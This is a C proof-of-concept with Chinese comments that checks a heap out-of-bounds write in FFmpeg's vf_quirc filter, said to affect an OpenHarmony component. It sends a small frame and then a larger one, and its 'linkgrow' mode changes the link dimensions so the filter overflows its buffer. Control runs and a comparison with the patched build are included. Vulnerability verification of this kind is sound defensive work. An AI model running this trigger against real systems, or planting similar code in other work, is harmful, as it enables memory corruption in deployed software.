/*
 * CVE-2026-66041 运行验证 PoC — third_party/ffmpeg vf_quirc 堆越界写
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavfilter/vf_quirc.c
 * 与上游 n7.1.1 同文件逐字节一致（sha256 相同）；本 PoC 在上游
 * n7.1.1 构建上执行，结论直接代表 OH 组件。
 *
 * 触发原理：quirc 滤镜仅在 config_input 时按初始输入尺寸分配解码
 * 缓冲（quirc_resize）；后续帧尺寸变大时 filter_frame 不再检查，
 * av_image_copy_plane 将整帧拷入旧缓冲 → 堆越界写。
 *
 * 用法：./poc_quirc trigger|control|linkgrow
 *   trigger:  先 64x64 后 512x512 两帧 GRAY8（buffersrc 透传变尺寸帧，
 *             link 尺寸不变——验证该路径下滤镜行为）
 *   control:  两帧均 64x64（预期两侧构建均正常）
 *   linkgrow: 64x64 帧后，模拟"link 参数在 config_input 之后变化"
 *             （上游重协商半途/不规范上游滤镜子集会出现的现场——正是
 *             上游修复 4da9812 所防御的条件 quirc->width != inlink->w），
 *             将 link 尺寸改为 512x512 并推 512x512 帧。
 * 判读：ASan 下原版构建 linkgrow 模式报 heap-buffer-overflow（quirc
 *       缓冲仍为 64x64 而按 512x512 拷入，漏洞观测）；补丁版（上游
 *       4da9812e）linkgrow 正常（filter_frame 内先 resize 再拷贝）；
 *       control 模式两侧构建均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/opt.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h, int fill)
{
    AVFrame *f = av_frame_alloc();
    if (!f) return -1;
    f->format = AV_PIX_FMT_GRAY8;
    f->width = w;
    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) { av_frame_free(&f); return -1; }
    memset(f->data[0], fill, (size_t)f->linesize[0] * h);
    int ret = av_buffersrc_add_frame(src, f);
    av_frame_free(&f);
    return ret;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "usage: %s trigger|control|linkgrow\n", argv[0]); return 2; }
    int trigger = !strcmp(argv[1], "trigger");
    int linkgrow = !strcmp(argv[1], "linkgrow");
    if (!trigger && !linkgrow && strcmp(argv[1], "control")) { fprintf(stderr, "bad mode\n"); return 2; }

    char graph[256];
    snprintf(graph, sizeof graph,
             "buffer=video_size=64x64:pix_fmt=gray8:time_base=1/25,"
             "quirc,buffersink");

    AVFilterGraph *g = avfilter_graph_alloc();
    AVFilterInOut *in = NULL, *out = NULL;
    if (avfilter_graph_parse_ptr(g, graph, &in, &out, NULL) < 0) {
        fprintf(stderr, "FAIL: graph parse\n"); return 2;
    }
    if (avfilter_graph_config(g, NULL) < 0) {
        fprintf(stderr, "FAIL: graph config\n"); return 2;
    }
    AVFilterContext *src = NULL, *sinkc = NULL;
    for (unsigned i = 0; i < g->nb_filters && !(src && sinkc); i++) {
        const char *n = g->filters[i]->filter->name;
        if (!src && !strcmp(n, "buffer")) src = g->filters[i];
        else if (!sinkc && !strcmp(n, "buffersink")) sinkc = g->filters[i];
    }
    if (!src || !sinkc) { fprintf(stderr, "FAIL: buffersrc/sink not found\n"); return 2; }

    /* 帧 1：声明尺寸 64x64（config_input 按此分配 quirc 缓冲） */
    int r1 = push_frame(src, 64, 64, 0x80);

    /* 帧 1 先排空（确保其 filter_frame 在旧 link 尺寸下完成） */
    AVFrame *drain = av_frame_alloc();
    while (av_buffersink_get_frame(sinkc, drain) >= 0) av_frame_unref(drain);
    av_frame_free(&drain);

    /* 帧 2 */
    int r2;
    if (linkgrow) {
        /* 模拟 link 尺寸在 config_input 之后变化（上游修复防御的场景） */
        src->outputs[0]->w = 512;
        src->outputs[0]->h = 512;
        r2 = push_frame(src, 512, 512, 0xC0);
    } else if (trigger) {
        r2 = push_frame(src, 512, 512, 0xC0);
    } else {
        r2 = push_frame(src, 64, 64, 0xC0);
    }

    /* 排空 sink */
    AVFrame *sink = av_frame_alloc();
    int pulled = 0, ret;
    while ((ret = av_buffersink_get_frame(sinkc, sink)) >= 0) {
        pulled++;
        av_frame_unref(sink);
    }
    av_frame_free(&sink);

    printf("CASE_DONE mode=%s push1=%d push2=%d pulled=%d\n",
           linkgrow ? "linkgrow" : (trigger ? "trigger" : "control"),
           r1, r2, pulled);

    avfilter_inout_free(&in);
    avfilter_inout_free(&out);
    avfilter_graph_free(&g);
    return 0;
}
